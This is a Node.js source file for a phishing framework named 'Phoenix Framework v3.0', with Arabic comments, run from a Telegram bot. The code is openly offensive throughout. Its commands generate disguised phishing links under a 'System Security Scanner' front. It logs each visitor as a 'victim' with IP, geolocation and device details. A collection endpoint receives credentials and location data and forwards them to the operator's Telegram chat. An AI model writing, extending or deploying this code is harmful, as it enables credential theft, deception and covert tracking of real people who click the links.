const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const crypto = require('crypto');
const geoip = require('geoip-lite');
const useragent = require('useragent');
const { exec } = require('child_process');
const fs = require('fs-extra');
const path = require('path');

const app = express();
const bot = new TelegramBot(process.env.BOT_TOKEN, {polling: true});
const victims = new Map();
const wss = new WebSocket.Server({ port: 8080 });

// Middleware للتشفير
app.use(express.json({limit: '100mb'}));
app.use(express.urlencoded({extended: true, limit: '100mb'}));
app.use(express.static('public'));
app.set('view engine', 'ejs');

// إخفاء الهوية
app.use((req, res, next) => {
    res.removeHeader('X-Powered-By');
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    next();
});

// الصفحة الرئيسية
app.get('/', (req, res) => {
    res.send('System Security Scanner - Active');
});

// صفحة التصيد الرئيسية
app.get('/scan/:target', (req, res) => {
    const victimId = crypto.randomBytes(16).toString('hex');
    const targetUrl = Buffer.from(req.params.target, 'base64').toString();
    
    const victimData = {
        id: victimId,
        ip: req.ip || req.connection.remoteAddress,
        userAgent: req.get('User-Agent'),
        target: targetUrl,
        geo: geoip.lookup(req.ip),
        agent: useragent.parse(req.headers['user-agent']),
        data: {},
        connected: new Date()
    };
    
    victims.set(victimId, victimData);
    
    // إرسال إشعار للبوت
    bot.sendMessage(process.env.ADMIN_CHAT_ID, 
        `🎯 ضحية جديدة متصلة!\n` +
        `🆔 ID: ${victimId}\n` +
        `🌍 Location: ${victimData.geo ? victimData.geo.country : 'Unknown'}\n` +
        `🖥️ Device: ${victimData.agent.family}\n` +
        `🔗 Target: ${targetUrl}`
    );

    res.render('security', {
        victimId: victimId,
        targetUrl: targetUrl,
        securityCode: Math.floor(100000 + Math.random() * 900000)
    });
});

// API لاستقبال البيانات
app.post('/api/collect', async (req, res) => {
    try {
        const { victimId, dataType, payload } = req.body;
        const victim = victims.get(victimId);
        
        if (victim) {
            victim.data[dataType] = payload;
            
            // إرسال إشعار فوري للبيانات المهمة
            if (dataType === 'credentials' || dataType === 'location') {
                await bot.sendMessage(process.env.ADMIN_CHAT_ID,
                    `📊 بيانات جديدة من ${victimId}\n` +
                    `🎯 النوع: ${dataType}\n` +
                    `📝 البيانات: ${JSON.stringify(payload).substring(0, 200)}`
                );
            }
        }
        
        res.json({status: 'success'});
    } catch (error) {
        res.status(500).json({error: error.message});
    }
});

// WebSocket للاتصال المباشر
wss.on('connection', (ws) => {
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'victim_connect') {
                ws.victimId = data.victimId;
            }
        } catch (error) {
            console.error('WebSocket error:', error);
        }
    });
});

// أوامر البوت
bot.onText(/\/start/, (msg) => {
    const welcomeMsg = `🕵️ **Phoenix Framework v3.0**\n\n` +
        `**الأوامر المتاحة:**\n` +
        `/create [url] - إنشاء رابط تصيد\n` +
        `/victims - عرض الضحايا النشطين\n` +
        `/screenshot [id] - التقاط لقطة شاشة\n` +
        `/info [id] - معلومات الضحية\n` +
        `/cleanup - تنظيف النظام`;
    
    bot.sendMessage(msg.chat.id, welcomeMsg, {parse_mode: 'Markdown'});
});

bot.onText(/\/create (.+)/, (msg, match) => {
    const url = match[1];
    const encodedUrl = Buffer.from(url).toString('base64');
    const attackUrl = `https://${process.env.REPLIT_DOMAIN}/scan/${encodedUrl}`;
    
    const createMsg = `🎣 **رابط التصيد الجديد**\n\n` +
        `🔗 الرابط: ${attackUrl}\n` +
        `🎯 الهدف: ${url}\n` +
        `📊 استخدم /victins لمشاهدة النتائج`;
    
    bot.sendMessage(msg.chat.id, createMsg, {parse_mode: 'Markdown'});
});

bot.onText(/\/victims/, (msg) => {
    if (victims.size === 0) {
        bot.sendMessage(msg.chat.id, '👥 لا يوجد ضحايا نشطين حالياً');
        return;
    }
    
    let victimsList = `👥 **الضحايا النشطين (${victims.size})**\n\n`;
    
    victims.forEach((victim, id) => {
        victimsList += `🆔 ${id.substring(0, 8)}...\n` +
                      `🌍 ${victim.geo?.country || 'Unknown'}\n` +
                      `🖥️ ${victim.agent.family}\n` +
                      `📊 ${Object.keys(victim.data).length} بيانات\n` +
                      `⏰ ${Math.floor((new Date() - victim.connected) / 60000)} دقيقة\n\n`;
    });
    
    bot.sendMessage(msg.chat.id, victimsList, {parse_mode: 'Markdown'});
});

bot.onText(/\/info (.+)/, (msg, match) => {
    const victimId = match[1];
    const victim = victims.get(victimId);
    
    if (!victim) {
        bot.sendMessage(msg.chat.id, '❌ الضحية غير موجودة');
        return;
    }
    
    const infoMsg = `📋 **معلومات الضحية**\n\n` +
        `🆔 ID: ${victim.id}\n` +
        `🌐 IP: ${victim.ip}\n` +
        `🌍 Country: ${victim.geo?.country || 'Unknown'}\n` +
        `🏙️ City: ${victim.geo?.city || 'Unknown'}\n` +
        `🖥️ Browser: ${victim.agent.family}\n` +
        `⚙️ OS: ${victim.agent.os}\n` +
        `📱 Device: ${victim.agent.device}\n` +
        `🎯 Target: ${victim.target}\n` +
        `⏰ Connected: ${victim.connected.toLocaleString()}\n` +
        `📊 Data Types: ${Object.keys(victim.data).join(', ')}`;
    
    bot.sendMessage(msg.chat.id, infoMsg, {parse_mode: 'Markdown'});
});

// تشغيل الخادم
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Phoenix Framework running on port ${PORT}`);
    bot.sendMessage(process.env.ADMIN_CHAT_ID, 
        `✅ Phoenix Framework v3.0 Started!\n` +
        `🌐 Domain: ${process.env.REPLIT_DOMAIN}\n` +
        `🕒 Time: ${new Date().toLocaleString()}`
    );
});
